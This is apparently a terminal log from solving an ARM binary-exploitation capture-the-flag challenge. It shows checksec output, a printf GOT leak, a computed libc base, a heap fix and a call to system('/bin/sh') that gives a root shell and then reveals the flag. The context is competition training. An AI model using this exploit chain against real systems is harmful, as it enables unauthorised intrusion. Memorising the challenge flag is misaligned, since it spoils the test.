user@reversing:~/cyberstakes/armed$ ./solve.py
[+] Opening connection to on.acictf.com on port 34053: Done
[*] '/home/user/cyberstakes/armed/armed'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
[*] '/home/user/cyberstakes/armed/libc.so.6'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] printf.got : 0xf66cdb30
[*] libc base: 0xf6686000
[*] Fixing heap state...
[*] /bin/sh addr: 0xf67a721c
[*] Triggering system...
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls
ARMed
arm_libs
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
$ cat flag
ACI{9bcf1e35201d1f5029366a3554f}
$
[*] Interrupted
[*] Closed connection to on.acictf.com port 34053
